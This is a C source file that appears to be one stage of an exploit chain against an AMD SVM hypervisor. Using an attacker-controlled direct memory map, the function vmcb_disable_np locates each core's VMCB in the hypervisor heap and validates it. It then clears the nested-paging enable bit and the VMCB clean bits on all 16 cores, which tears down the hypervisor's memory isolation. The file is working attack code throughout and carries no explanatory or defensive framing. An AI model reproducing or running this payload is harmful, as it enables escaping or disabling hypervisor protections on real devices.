#include <stdint.h>
#include "../include/stage_status.h"

#define VMCB_NESTED_CTRL    0x90
#define VMCB_NESTED_CR3     0xB0
#define VMCB_CONTROL2       0xB8
#define VMCB_CLEAN          0xC0

#define read64(p)           (*(volatile uint64_t *) (uint64_t) (p))
#define write64(p, v)       (*(volatile uint64_t *) (uint64_t) (p) = (uint64_t) (v))
#define write32(p, v)       (*(volatile uint32_t *) (uint64_t) (p) = (uint32_t) (v))

static int stage_enter(uint64_t *stage)
{
  uint64_t observed = __atomic_load_n(stage, __ATOMIC_SEQ_CST);
  if (observed == STAGE_AP_INVALID || observed == STAGE_AP_COMPLETE)
    return 0;
  uint64_t expected = STAGE_HOOK_FIRED;
  __atomic_compare_exchange_n(stage, &expected, STAGE_AP_ENTERED, 0,
                              __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST);
  return 1;
}

static void stage_complete(uint64_t *stage)
{
  uint64_t observed = __atomic_load_n(stage, __ATOMIC_SEQ_CST);
  while (observed != STAGE_AP_INVALID && observed != STAGE_AP_COMPLETE &&
         !__atomic_compare_exchange_n(stage, &observed, STAGE_AP_COMPLETE, 0,
                                      __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {}
}

void vmcb_disable_np(uint64_t *param)
{
  uint64_t dmap        = param[1];
  uint64_t hv_heap_off = param[4];
  uint64_t pcpus       = param[5];
  uint64_t *stage      = (uint64_t *)(uintptr_t)param[2];

  if (!stage_enter(stage))
    return;

  uint64_t heap = read64(dmap + hv_heap_off);

  /* Validate every core before changing any VMCB. Multiple APs may execute
     this code, so a second pass accepts a VMCB already changed from 9 to 8. */
  uint64_t vpa[16];
  if (!heap) {
    __atomic_store_n(stage, STAGE_AP_INVALID, __ATOMIC_SEQ_CST);
    return;
  }

  for (int core = 0; core < 16; core++) {
    uint64_t pcpu = read64(dmap + pcpus + (uint64_t) core * sizeof(uint64_t));
    if (!pcpu || pcpu < heap) {
      __atomic_store_n(stage, STAGE_AP_INVALID, __ATOMIC_SEQ_CST);
      return;
    }
    uint64_t vmcb = read64(dmap + (pcpu - heap) + 0xa8);
    if (!vmcb || vmcb < heap || ((vmcb - heap) & 0xfff)) {
      __atomic_store_n(stage, STAGE_AP_INVALID, __ATOMIC_SEQ_CST);
      return;
    }

    vpa[core] = vmcb - heap;
    for (int prior = 0; prior < core; prior++) {
      if (vpa[core] == vpa[prior]) {
        __atomic_store_n(stage, STAGE_AP_INVALID, __ATOMIC_SEQ_CST);
        return;
      }
    }
    uint64_t ncr3 = read64(dmap + vpa[core] + VMCB_NESTED_CR3);
    uint64_t nested_ctrl = read64(dmap + vpa[core] + VMCB_NESTED_CTRL);
    if ((nested_ctrl != 9 && nested_ctrl != 8) ||
        read64(dmap + vpa[core] + VMCB_CONTROL2) != 1 ||
        !ncr3 || (ncr3 & 0xfff)) {
      __atomic_store_n(stage, STAGE_AP_INVALID, __ATOMIC_SEQ_CST);
      return;
    }
  }

  for (int core = 0; core < 16; core++) {
    uint64_t old = read64(dmap + vpa[core] + VMCB_NESTED_CTRL);
    write64(dmap + vpa[core] + VMCB_NESTED_CTRL, old & ~UINT64_C(1));
    write32(dmap + vpa[core] + VMCB_CLEAN, 0);
    if ((read64(dmap + vpa[core] + VMCB_NESTED_CTRL) & 1) ||
        (*(volatile uint32_t *)(uint64_t)(dmap + vpa[core] + VMCB_CLEAN)) != 0) {
      __atomic_store_n(stage, STAGE_AP_INVALID, __ATOMIC_SEQ_CST);
      return;
    }
  }

  stage_complete(stage);
}
